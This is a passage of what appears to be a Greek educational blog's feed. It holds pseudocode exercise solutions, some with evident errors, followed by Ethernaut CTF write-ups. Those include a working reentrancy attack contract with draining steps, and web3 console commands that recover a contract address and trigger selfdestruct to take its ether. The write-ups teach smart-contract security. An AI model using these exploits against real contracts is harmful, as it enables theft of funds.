ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-5">Άσκηση 5:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ05
ΜΕΤΑΒΛΗΤΕΣ:
ΠΡΑΓΜΑΤΙΚΕΣ: ΑΡΙΘΜΟΣ
ΑΚΕΡΑΙΕΣ: ΗΛΙΚΙΑ,ΧΡΟΝΟΛΟΓΙΑ
ΑΡΧΗ
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΒΑΣΕ ΧΡΟΝΟΛΟΓΙΑ,ΗΛΙΚΙΑ
ΧΡΟΝΟΣ_ΓΕΝΝΗΣΗΣ&amp;lt;-ΧΡΟΝΟΛΟΓΙΑ-ΗΛΙΚΙΑ
ΓΡΑΨΕ ΧΡΟΝΟΣ_ΓΕΝΝΗΣΗΣ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-6">Άσκηση 6:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ06
ΜΕΤΑΒΛΗΤΕΣ:
ΧΑΡΑΚΤΗΡΕΣ: απαντηση
ΠΡΑΓΜΑΤΙΚΟΙ: βαθμοςα ,βαθμοςβ ,μο, ποσοστο
ΔΙΑΒΑΣΕ βαθμοςα, βαθμοςβ
μο = ( βαθμοςα + βαθμοςβ )/2
ΑΝ ( βαθμοςα &amp;gt; βαθμοςβ ) ΤΟΤΕ
ποσοστο= ( (βαθμοςα div βαθμοςβ )+ (βαθμοςα mod βαθμοςβ ) -1)*100
ΑΛΛΙΩΣ_ΑΝ ( βαθμοςα &amp;lt; βαθμοςβ ) ΤΟΤΕ
ποσοστο= ( (βαθμοςβ div βαθμοςα )+ (βαθμοςβ mod βαθμοςα ) -1)*100
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-7">Άσκηση 7:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ AΣK07
ΣΤΑΘΕΡΕΣ:
πάγιο = 2
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ: mb ,counter
ΠΡΑΓΜΑΤΙΚΕΣ: χρέωση, φόρος, ΦΠΑ ,χρεωση1
ΧΑΡΑΚΤΗΡΕΣ: Ονομα,Ονομα1
ΑΡΧΗ
counter&amp;lt;-0
ΟΣΟ counter&amp;lt;2
ΔΙΑΒΑΣΕ όνομα, mb
ΑΝ mb &amp;lt;= 200 ΤΟΤΕ
χρέωση &amp;lt;- πάγιο + 0.04 * mb
ΑΛΛΙΩΣ_ΑΝ mb &amp;lt;= 500 ΤΟΤΕ
χρέωση &amp;lt;- πάγιο + 0.04 * 200 + 0.05 * (mb - 200)
ΑΛΛΙΩΣ_ΑΝ mb &amp;lt;= 1024 ΤΟΤΕ
χρέωση &amp;lt;- πάγιο + 0.04 * 200 + 0.05 * 500 + 0.10 * (mb - 500)
ΑΛΛΙΩΣ_ΑΝ mb &amp;gt; 1024
χρέωση &amp;lt;- πάγιο + 0.04 * 200 + 0.05 * 500 + 0.10 * 140 + 0.23 * (mb - 1024)
ΤΕΛΟΣ_ΑΝ
φόρος &amp;lt;- χρέωση * 0.02
ΦΠΑ &amp;lt;- χρέωση * 0.24
χρέωση &amp;lt;- χρέωση + φόρος + ΦΠΑ
ΑΝ counter=0 ΤΟΤΕ
χρεωση1&amp;lt;-χρεωση
Ονομα1&amp;lt;-Ονομα
ΤΕΛΟΣ_ΑΝ
counter&amp;lt;- counter+1
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
AN χρεωση1&amp;gt;χρεωση ΤΟΤΕ
ΓΡΑΨΕ Ονομα1 ,&amp;#34;Πλήρωσε περισσότερα&amp;#34;
ΑΛΛΙΩΣ
ΓΡΑΨΕ Ονομα ,&amp;#34;Πλήρωσε περισσότερα&amp;#34;
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ ΑΣΚ07
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-8α">Άσκηση 8Α:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ08A
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ:Χ
ΠΡΑΓΜΑΤΙΚΕΣ:fx
ΑΡΧΗ
ΔΙΑΒΑΣΕ Χ
ΑΝ Χ=1 ΤΟΤΕ
ΓΡΑΨΕ: &amp;#34;Η συνάρτηση δεν ορίζεται για χ=1&amp;#34;
ΑΛΛΙΩΣ
fx&amp;lt;- (4*X+ημ(X))
ΤΕΛΟΣ_ΑΝ
ΓΡΑΨΕ fx
ΤΕΛΟΣ ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-8β">Άσκηση 8Β:&lt;/h2>
&lt;pre tabindex="0">&lt;code>
ΠΡΟΓΡΑΜΜΑ ΑΣΚ08B
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ:Χ
ΠΡΑΓΜΑΤΙΚΕΣ:fx
ΑΡΧΗ
ΔΙΑΒΑΣΕ Χ
ΑΝ Χ=1 ΤΟΤΕ
ΓΡΑΨΕ: &amp;#34;Η συνάρτηση δεν ορίζεται για χ=1&amp;#34;
ΑΛΛΙΩΣ
fx&amp;lt;- (4*α*χ^2-(2^(1/2)))
ΤΕΛΟΣ_ΑΝ
ΓΡΑΨΕ fx
ΤΕΛΟΣ ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-8c">Άσκηση 8C:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ08D
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ:Χ
ΠΡΑΓΜΑΤΙΚΕΣ:fx
ΑΡΧΗ
ΔΙΑΒΑΣΕ Χ
ΑΝ Χ=1 ΤΟΤΕ
ΓΡΑΨΕ: &amp;#34;Η συνάρτηση δεν ορίζεται για χ=1&amp;#34;
ΑΛΛΙΩΣ
fx&amp;lt;- (3*(X^(X^2))+ημ(3*X)-4)/((X-1)^2)
ΤΕΛΟΣ_ΑΝ
ΓΡΑΨΕ fx
ΤΕΛΟΣ ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-8c-1">Άσκηση 8C:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ08C
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ:Χ
ΠΡΑΓΜΑΤΙΚΕΣ:fx
ΑΡΧΗ
ΔΙΑΒΑΣΕ Χ
ΑΝ Χ=1 ΤΟΤΕ
ΓΡΑΨΕ: &amp;#34;Η συνάρτηση δεν ορίζεται για χ=1&amp;#34;
ΑΛΛΙΩΣ
fx&amp;lt;- (e^X-1)/3
ΤΕΛΟΣ_ΑΝ
ΓΡΑΨΕ fx
ΤΕΛΟΣ ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-8d">Άσκηση 8D:&lt;/h2>
&lt;pre tabindex="0">&lt;code>
ΠΡΟΓΡΑΜΜΑ ΑΣΚ08D
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ:Χ
ΠΡΑΓΜΑΤΙΚΕΣ:fx
ΑΡΧΗ
ΔΙΑΒΑΣΕ Χ
ΑΝ Χ=1 ΤΟΤΕ
ΓΡΑΨΕ: &amp;#34;Η συνάρτηση δεν ορίζεται για χ=1&amp;#34;
ΑΛΛΙΩΣ
fx&amp;lt;- (3*(X^(X^2))+ημ(3*X)-4)/(X-1)^2
ΤΕΛΟΣ_ΑΝ
ΓΡΑΨΕ fx
ΤΕΛΟΣ ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-8e">Άσκηση 8E:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ08E
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ:Χ
ΠΡΑΓΜΑΤΙΚΕΣ:fx
ΑΡΧΗ
ΔΙΑΒΑΣΕ Χ
ΑΝ Χ=1 ΤΟΤΕ
ΓΡΑΨΕ: &amp;#34;Η συνάρτηση δεν ορίζεται για χ=1&amp;#34;
ΑΛΛΙΩΣ
fx&amp;lt;- ((3*(X^(X^2))+ημ(3*X)-4)/(X-1)^2)/(x-1)
ΤΕΛΟΣ_ΑΝ
ΓΡΑΨΕ fx
ΤΕΛΟΣ ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-9">Άσκηση 9:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ09
ΜΕΤΑΒΛΗΤΕΣ:
ΠΡΑΓΜΑΤΙΚΕΣ:ΤΙΜΗΦΠΑ,ΦΠΑ,ΤΙΜΗ,ΤΙΜΗΧΩΡΙΣ
ΧΑΡΑΚΤΗΡΕΣ: ΕΠΙΛΟΓΗ
ΑΡΧΗ
ΔΙΑΒΑΣΕ ΕΠΙΛΟΓΗ
ΟΣΟ ΕΠΙΛΟΓΗ!=&amp;#39;δ&amp;#39; ΕΠΑΝΑΛΑΒΕ
ΑΝ ΕΠΙΛΟΓΗ=&amp;#39;α&amp;#39; ΤΟΤΕ
ΔΙΑΒΑΣΕ ΤΙΜΗ
ΤΙΜΗ&amp;lt;- ΤΙΜΗ + ΤΙΜΗ*ΦΠΑ
ΑΛΛΙΩΣ_ΑΝ ΕΠΙΛΟΓΗ=&amp;#39;β&amp;#39; ΤΟΤΕ
ΔΙΑΒΑΣΕ ΤΙΜΗ
ΤΙΜΗ&amp;lt;- ΤΙΜΗ-ΤΙΜΗ*ΦΠΑ
ΑΛΛΙΩΣ_ΑΝ ΕΠΙΛΟΓΗ=&amp;#39;δ&amp;#39; ΤΟΤΕ
ΔΙΑΒΑΣΕ ΤΙΜΗΧΩΡΙΣ,ΤΙΜΗΦΠΑ
ΤΙΜΗ&amp;lt;- ( ΤΙΜΗΦΠΑ-ΤΙΜΗΧΩΡΙΣ )/ΤΙΜΗΧΩΡΙΣ
ΑΛΛΙΩΣ
ΓΡΑΨΕ &amp;#34;INVALID &amp;#34;
ΤΕΛΟΣ_ΑΝ
ΔΙΑΒΑΣΕ ΕΠΙΛΟΓΗ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-10">Άσκηση 10:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚΗΣΗ10
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ: Χωρητικότητα, Μέγεθος, Πλήθος_Αρχείων, Πλήθος_12Άνω, Min1, Min2
ΠΡΑΓΜΑΤΙΚΕΣ: Ποσοστό
ΧΑΡΑΚΤΗΡΕΣ: Όνομα, Όνομα_Min1, Όνομα_Min2
ΛΟΓΙΚΕΣ: Τέλος_Αποθήκευσης
ΑΡΧΗ
! Γ1
Πλήθος_Αρχείων &amp;lt;-- 0
Πλήθος_10Άνω &amp;lt;-- 0
Χωρητικότητα &amp;lt;-- 600
Τέλος_Αποθήκευσης &amp;lt;-- ΨΕΥΔΗΣ
Min1 &amp;lt;-- 1001 ! Βλέπε παράδειγμα 3, Κεφάλαιο 2
Min2 &amp;lt;-- 1002
Όνομα_Min1 &amp;lt;-- &amp;#39;ΤΥΧΑΙΟ&amp;#39; ! Σημαντική Λεπτομέρεια που δυστυχώς παραλείπεται συχνά
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ &amp;#39;ΔΩΣΤΕ ΟΝΟΜΑ ΑΡΧΕΙΟΥ: &amp;#39;
ΔΙΑΒΑΣΕ Όνομα
ΓΡΑΨΕ &amp;#39;ΔΩΣΤΕ ΜΕΓΕΘΟΣ ΑΡΧΕΙΟΥ: &amp;#39;
ΔΙΑΒΑΣΕ Μέγεθος
ΑΝ Χωρητικότητα - Μέγεθος &amp;gt; 0 ΤΟΤΕ
Χωρητικότητα &amp;lt;-- Χωρητικότητα - Μέγεθος
Πλήθος_Αρχείων &amp;lt;-- Πλήθος_Αρχείων + 1 ! Γ2
ΓΡΑΨΕ &amp;#39;Επιτρεπτή αποθήκευση&amp;#39;
ΑΝ Μέγεθος &amp;gt; 10 ΤΟΤΕ ! Γ2
Πλήθος_10Άνω &amp;lt;-- Πλήθος_10Άνω + 1
ΤΕΛΟΣ_ΑΝ
! Γ3
ΑΝ Μέγεθος &amp;lt; Min2 ΤΟΤΕ
ΑΝ Μέγεθος &amp;lt; Min1 ΤΟΤΕ
Min2 &amp;lt;-- Min1
Όνομα_Min2 &amp;lt;-- Όνομα_Min1
Min1 &amp;lt;-- Μέγεθος
Όνομα_Min1 &amp;lt;-- Όνομα
ΑΛΛΙΩΣ
Min2 &amp;lt;-- Μέγεθος
Όνομα_Min2 &amp;lt;-- Όνομα
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΑΝ
ΑΛΛΙΩΣ
Τέλος_Αποθήκευσης &amp;lt;-- ΑΛΗΘΗΣ
ΤΕΛΟΣ_ΑΝ
ΜΕΧΡΙΣ_ΟΤΟΥ (Τέλος_Αποθήκευσης = ΑΛΗΘΗΣ)
! Γ2
Ποσοστό &amp;lt;-- Πλήθος_12Άνω / Πλήθος_Αρχείων * 100
ΓΡΑΨΕ &amp;#39;Ποσοστό Αρχείων Άνω των 12GB: &amp;#39;, Ποσοστό
! Γ3
ΓΡΑΨΕ &amp;#39;Μικρότερο Αρχείο 1: &amp;#39;, Όνομα_Min1, &amp;#39; Χωρητικότητα: &amp;#39;, Min1
ΓΡΑΨΕ &amp;#39;Μικρότερο Αρχείο 2: &amp;#39;, Όνομα_Min2, &amp;#39; Χωρητικότητα: &amp;#39;, Min2
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="υποστηρίξτε-το-project-για-να-συνεχίσουμε-να-παράγουμε-εκπαιδευτικό-υλικό">Υποστηρίξτε το Project για να συνεχίσουμε να παράγουμε εκπαιδευτικό υλικό.&lt;/h2>
&lt;p>Προσοχή: Από τις 28 Δεκεμβρίου το Project Panellinies_AEPP απενεργοποιεί όλες τις διαφημίσεις πάνω στο εκπαιδευτικό υλικό.
Τo Project πλέον λειτουργεί και υποστηρίζεται αποκλειστικά από τις χορηγίες σας σε Basic Attention Token (BAT) μέσω του Brave Browser &lt;a href="https://www.youtube.com/LinuxOSblog/">στο κανάλι στο Youtube&lt;/a> καθώς και σε άλλα κρυπτονομίσματα στις παρακάτω διευθύνσεις:&lt;/p>
&lt;p>Bitcoin: bc1q6j959m3whh44ztr8k6p7545n5pzcsncple7qmy&lt;/p>
&lt;p>Ethereum: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Cardano: addr1qxewtm0y5yk2mgf93ct4ghguus2shu34fu786t62j3tv7296evenhmr0ltmx3hdyw4d6d8gj8qspry5pe3raaw4nu8as7jsr9l&lt;/p>
&lt;p>Monero: 46ewn3rgXMSceuEUEng1bze1RzG61rEiFV3hJ6VKuzvHU62jPntydJRBcFinQ62Pad8AvdoX9YbQcY5HKX3Cr3UQPkhiQ4L&lt;/p>
&lt;p>VeChain:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Shiba:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>AIOZ:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Για το πώς θα κερδίσετε δωρεάν BAT, διαβάστε αυτό το άρθρο κάνοντας κλικ &lt;a href="https://cerebrux.net/2021/02/25/brave-bat-token/">εδώ&lt;/a>&lt;/p>
&lt;p>&lt;img src="/img/brave.png" alt="">&lt;/p></content></item><item><title>Reeintrancy - Ethernaut</title><link>/blockchain_writeups/reeinctancy/</link><pubDate>Tue, 01 Feb 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/reeinctancy/</guid><description>On this challenge, we will learn how the infamous DAO occured and how to prevent such an incident to occur again. Ethereum splitted into two Blockchains, Ethereum and Ethereum Classic because of a DAO Attack. So we have this smart-contract and we have to withdraw all of it&amp;rsquo;s ether:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;; contract Reentrance { using SafeMath for uint256; mapping(address =&amp;gt; uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].</description><content>&lt;p>On this challenge, we will learn how the infamous DAO occured and how to prevent such an incident to occur again. Ethereum splitted into two Blockchains, Ethereum and Ethereum Classic because of a DAO Attack.
So we have this smart-contract and we have to withdraw all of it&amp;rsquo;s ether:&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;;
contract Reentrance {
using SafeMath for uint256;
mapping(address =&amp;gt; uint) public balances;
function donate(address _to) public payable {
balances[_to] = balances[_to].add(msg.value);
}
function balanceOf(address _who) public view returns (uint balance) {
return balances[_who];
}
function withdraw(uint _amount) public {
if(balances[msg.sender] &amp;gt;= _amount) {
(bool result,) = msg.sender.call{value:_amount}(&amp;#34;&amp;#34;);
if(result) {
_amount;
}
balances[msg.sender] -= _amount;
}
}
receive() external payable {}
}
&lt;/code>&lt;/pre>&lt;p>Re-entrancy happens in single-thread computing environments, when the execution stack jumps or calls subroutines, before returning to the original execution.
Firstly, we create a smart-contract called ReentranceAttack.sol with which we are going to attack the main smart-contract shown above:&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;
import &amp;#39;./Reentrance.sol&amp;#39;;
contract ReentranceAttack {
Reentrance target;
uint public amount = 1 ether;
constructor(address payable _targetAddr) public payable {
target= Reentrance(_targetAddr);
}
function donateToTarget() public {
target.donate.value(amount).gas(4000000)(address(this)); }
fallback() external payable {
if (address(target).balance !=0){
target.withdraw(amount);
}
}
}
&lt;/code>&lt;/pre>&lt;p>We need to take into account these two criterias:&lt;/p>
&lt;ul>
&lt;li>Fallback functions can be called by anyone and execute malicious code.&lt;/li>
&lt;li>Malicious external contracts can abuse withdrawals.&lt;/li>
&lt;/ul>
&lt;p>The expoitation was done by following these steps:&lt;/p>
&lt;ul>
&lt;li>We deploy ReentranceAttack.sol with a value of 1 ether and as an address parameter we input the Reentrance.sol address which we find from the console by typing &amp;ldquo;contract.address&amp;rdquo;.&lt;/li>
&lt;li>We donate 1 ether to the Reentrance.sol by calling the function donateToTarget() from the ReentranceAttack.sol in order to add ReentranceAttack.sol address into balances.&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>mapping(address =&amp;gt; uint) public balances;
&lt;/code>&lt;/pre>&lt;p>Now that we are into balances, we satisfy the requirement of withdraw() function.&lt;/p>
&lt;ul>
&lt;li>By using the Remix IDE, we trigger the fallback() function from the ReentranceAttack.sol which calls the withdraw() function from the Reentrance.sol. Now the withdraw() function is called and we satisfy the requirement of it, it will call back the fallback() function of the ReentranceAttack.sol and this loop will continue until the balance of the Reentrance.sol is zero.&lt;/li>
&lt;li>&lt;/li>
&lt;/ul>
&lt;p>There are multiple ways to protect your smart-contract in order to prevent issues like DAO Attack to happen.&lt;/p>
&lt;ul>
&lt;li>The order of execution really matters in programming, specially in Solidity. If we have to take external function calls, making the call must be the last thing to do. Even better,if we can invoke transfer in a separate function.&lt;/li>
&lt;li>Include a mutex to prevent re-entrancy. For example we can create a Boolean lock variable or a binary variable to signal execution depth.&lt;/li>
&lt;li>When we have to use function modifiers to check invariants, we should be extremely careful as modifiers are executed at the start of the function.&lt;/li>
&lt;li>Use transfer to move funds out of a smart-contract, as low level functions like call and send just return false but don&amp;rsquo;t interrupt the execution flow when receiving contract fails.&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></content></item><item><title>Recovery - Ethernaut</title><link>/blockchain_writeups/recovery/</link><pubDate>Sun, 30 Jan 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/recovery/</guid><description>On this challenge, we have a smart-contract that can built very simple tokens by its own. Anyone can create new tokens with ease. The point of this contract is to find the lost contract address and then withdraw all of its ether. At first, we check the code:
// SPDX-License-Identifier: MIT pragma solidity ^0.8.11; import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;; contract Recovery { //generate tokens function generateToken(string memory _name, uint256 _initialSupply) public { new SimpleToken(_name, msg.</description><content>&lt;p>On this challenge, we have a smart-contract that can built very simple tokens by its own. Anyone can create new tokens with ease. The point of this contract is to find the lost contract address and then withdraw all of its ether.
At first, we check the code:&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;;
contract Recovery {
//generate tokens
function generateToken(string memory _name, uint256 _initialSupply) public {
new SimpleToken(_name, msg.sender, _initialSupply);
}
}
contract SimpleToken {
using SafeMath for uint256;
// public variables
string public name;
mapping (address =&amp;gt; uint) public balances;
// constructor
constructor(string memory _name, address _creator, uint256 _initialSupply) public {
name = _name;
balances[_creator] = _initialSupply;
}
// collect ether in return for tokens
receive() external payable {
balances[msg.sender] = msg.value.mul(10);
}
// allow transfers of tokens
function transfer(address _to, uint _amount) public {
require(balances[msg.sender] &amp;gt;= _amount);
balances[msg.sender] = balances[msg.sender].sub(_amount);
balances[_to] = _amount;
}
// clean up after ourselves
function destroy(address payable _to) public {
selfdestruct(_to);
}
}
&lt;/code>&lt;/pre>&lt;p>We can see that this smart contract has a destroy function with a selfdestruct() operator on it. However, the function destroy is not public payable. That means we can&amp;rsquo;t simply make a transaction and call it. We should find the address and then call it by using the contract&amp;rsquo;s address. We know that contract addresses are deterministically calculated. From Ethereum&amp;rsquo;s yellow paper we can read: &amp;ldquo;The address of the new account is defined as being the rightmost 160 bits of the Keccak hash of the RLP encoding of the structure containing only the sender and the account nonce. Thus we define the resultant address for the new account&amp;rdquo;.
We can represent this function as:&lt;/p>
&lt;pre tabindex="0">&lt;code>address = rightmost_20_bytes(keccak(RLP(sender address, nonce)))
&lt;/code>&lt;/pre>&lt;p>On which:&lt;/p>
&lt;ul>
&lt;li>&amp;ldquo;sender address&amp;rdquo; is the contract or wallet address that created this new contract. So, we can type in console &amp;ldquo;contract.address&amp;rdquo; and find it easily.&lt;/li>
&lt;li>&amp;ldquo;nonce&amp;rdquo; is the number of the transactions sent from the &amp;ldquo;sender address&amp;rdquo; or if the sender an another smart-contract, the &amp;ldquo;nonce&amp;rdquo; is the number of contract-creations made by this account.&lt;/li>
&lt;li>&amp;ldquo;RLP&amp;rdquo; is an encoder on data structure and is the default to serialize objects in Ethereum. The RLP encoding of a 20-byte address is 0xd6,0x94. Moreover, for all intenger less than 0x7f, its encoding its just its own byte value. As result, the RLP of 1 is 0x01. We keep that in mind for the next step.&lt;/li>
&lt;li>&amp;ldquo;keccak&amp;rdquo; is the cryptographic primitive that compute the Ethereum SHA3 hash on any input. Is also refered as Keccak-256.&lt;/li>
&lt;/ul>
&lt;p>So now we can recalculate the address of the new contract by an existing contract located at the contract.address. It should be mentioned that the nonce 0 is always the event of smart contract&amp;rsquo;s creation. So, we will begin to counting from 1. We know that RLP of 1 is 0x01, so by using the web3 utils, we will try to use the function we described above:&lt;/p>
&lt;pre tabindex="0">&lt;code>web3.utils.soliditySha3(&amp;#34;0xd6&amp;#34;, &amp;#34;0x94&amp;#34;, &amp;#34;0xEa90EAAAB78241373b94C98a788524582DA2e593&amp;#34; , &amp;#34;0x01&amp;#34;)
&lt;/code>&lt;/pre>&lt;p>This will return this hexademical:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-'0xa1ed98d854d1b4ee7a4aa44816a095b1578566ec7fd216246a8c0a6322f67331'" data-lang="'0xa1ed98d854d1b4ee7a4aa44816a095b1578566ec7fd216246a8c0a6322f67331'">&lt;/code>&lt;/pre>&lt;p>We will keep only the last 40 characters :&lt;/p>
&lt;pre tabindex="0">&lt;code>16a095b1578566ec7fd216246a8c0a6322f67331
&lt;/code>&lt;/pre>&lt;p>Then we have the smart contract address. Now we can check in Etherscan.io this address and we can find out that it has 0.01 ether inside. As we have the address now we can try to call the destruct function. Therefore, we will encode a function call from console:&lt;/p>
&lt;pre tabindex="0">&lt;code>data = web3.eth.abi.encodeFunctionCall({
name: &amp;#39;destroy&amp;#39; ,
type: &amp;#39;function&amp;#39;,
inputs: [{
type: &amp;#39;address&amp;#39;,
name: &amp;#39;_to&amp;#39; }]
}, [player]);
&lt;/code>&lt;/pre>&lt;p>And then we will create a transaction having our own player address in order to be sent to us the smart&amp;rsquo;s contract ether when we trigger selfdestruct() operation:&lt;/p>
&lt;pre tabindex="0">&lt;code>await web3.eth.sendTransaction({
to: &amp;#34;0x16a095B1578566ec7fd216246A8C0A6322F67331&amp;#34;,
from: player,
data: data } )
&lt;/code>&lt;/pre>&lt;p>We pay the transaction fees and now we transfer all of the contract&amp;rsquo;s ether to our wallet.
From this challenge, we learnt that we can send Ethers to a deterministic address, when the contract does not exist, at least for now.&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></content></item><item><title>Privacy - Ethernaut</title><link>/blockchain_writeups/privacy/</link><pubDate>Wed, 26 Jan 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/privacy/</guid><description>On this challenge, we have to unlock a vault again, but this is a more advanced one.
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Privacy { bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; constructor(bytes32[3] memory _data) public { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms.</description><content>&lt;p>On this challenge, we have to unlock a vault again, but this is a more advanced one.&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Privacy {
bool public locked = true;
uint256 public ID = block.timestamp;
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(now);
bytes32[3] private data;
constructor(bytes32[3] memory _data) public {
data = _data;
}
function unlock(bytes16 _key) public {
require(_key == bytes16(data[2]));
locked = false;
}
/*
A bunch of super advanced solidity algorithms...
,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`
.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,
*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^ ,---/V\
`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*. ~|__(o.o)
